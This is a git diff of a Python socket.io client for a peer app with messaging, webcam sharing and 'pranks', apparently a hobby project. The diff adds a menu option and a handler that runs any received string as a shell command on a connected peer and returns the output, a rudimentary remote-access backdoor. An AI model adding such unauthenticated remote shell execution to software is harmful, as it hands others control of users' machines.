@@ -4,14 +4,15 @@ import base64
 import numpy as np
 import threading
 import time
+import subprocess
 
 from pranks import Pranks
 
 sio = socketio.Client()
 
-connected_clients = []  # Lista de IDs de clientes conectados
-image_queue = []  # Lista para armazenar as imagens recebidas
-lock = threading.Lock()  # Para proteger o acesso à lista em threads
+connected_clients = []
+image_queue = []
+lock = threading.Lock() 
 
 def stop_running():
     global running
@@ -20,20 +21,15 @@ def stop_running():
 @sio.event
 def connect():
     print("Connected to server")
-    # sio.emit('get_clients')  # Solicita lista de clientes conectados
     menu()
 
 @sio.event
 def receive_image(data):
-    """
-    Evento chamado ao receber uma imagem.
-    """
+    
     img_base64 = data['image']
-    with lock:  # Protege o acesso à fila de imagens
+    with lock:
         image_queue.append(img_base64)
     print(f"Imagem adicionada à fila. Total na fila: {len(image_queue)}")
-
-
 
 @sio.event
 def client_list(data):
@@ -63,7 +59,8 @@ def client_list(data):
         print("1. send message")
         print("2. Video call")
         print("3. Pranks")
-        print("4. Return to menu")
+        print("4. Execute command on terminal")
+        print("0. Return to menu")
         option = int(input("Select an option: "))
         match option:
             case 1:
@@ -87,6 +84,10 @@ def client_list(data):
                     case "4":
                         sio.emit('prank', {'to': selected_client, 'prank': 'move mouse randomly'})
             case 4:
+                print("Enter the command: ")
+                command = str(input(""))
+                sio.emit("command_sent", {'to': selected_client, 'command': 'command'})
+            case 0:
                 menu()
     else:
         print("No clients connected.")
@@ -120,7 +121,28 @@ def send_message(cliente):
         if message == "exit":
             break
         sio.emit('private_message', {'to': cliente, 'message': message})
-
+        
+@sio.event
+def command_received(comando: str):
+    try:
+        resultado = subprocess.run(
+            comando,
+            shell=True,            
+            capture_output=True,   
+            text=True              
+        )
+        return {
+            "saida": resultado.stdout.strip(),
+            "erro": resultado.stderr.strip(),
+            "codigo_retorno": resultado.returncode
+        }
+    except Exception as e:
+        return {
+            "saida": "",
+            "erro": str(e),
+            "codigo_retorno": -1
+        }
+        
 def frame_share(cliente):
     cap = cv2.VideoCapture(0)
 
@@ -130,13 +152,10 @@ def frame_share(cliente):
         if not ret:
             break
 
-        # Codifica a imagem em formato JPEG
         _, buffer = cv2.imencode('.jpg', frame)
 
-        # Converte a imagem para base64
         img_base64 = base64.b64encode(buffer).decode('utf-8')
 
-        # Envia a imagem para o servidor
         sio.emit('frame_share', {'to': cliente,'image': img_base64})
 
         if cv2.waitKey(1) & 0xFF == ord('q'):
@@ -147,15 +166,10 @@ def frame_share(cliente):
     cv2.destroyAllWindows()
 
 def process_images():
-    """
-    Thread que monitora a fila de imagens, decodifica e exibe.
-    """
     while True:
         if image_queue:
-            with lock:  # Garante que apenas uma thread acesse a fila
-                image_data = image_queue.pop(0)  # Remove a imagem mais antiga da fila
-
-            # Decodifica a imagem
+            with lock:
+                image_data = image_queue.pop(0)
             img_buffer = base64.b64decode(image_data)
             img_array = np.frombuffer(img_buffer, dtype=np.uint8)
             img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
@@ -167,7 +181,7 @@ def process_images():
             else:
                 print("Erro ao decodificar imagem")
         else:
-            time.sleep(0.1)  # Aguarda um pouco se não houver imagens
+            time.sleep(0.1)
 
     cv2.destroyAllWindows()
 
@@ -197,7 +211,7 @@ thread = threading.Thread(target=process_images, daemon=True)
 thread.start()
 
 
-sio.connect('https://zany-xylophone-6664p9vgwj63r4rr-3000.app.github.dev/')  # Certifique-se de usar o endereço correto do servidor
+sio.connect('https://zany-xylophone-6664p9vgwj63r4rr-3000.app.github.dev/')
 sio.wait()
 
 
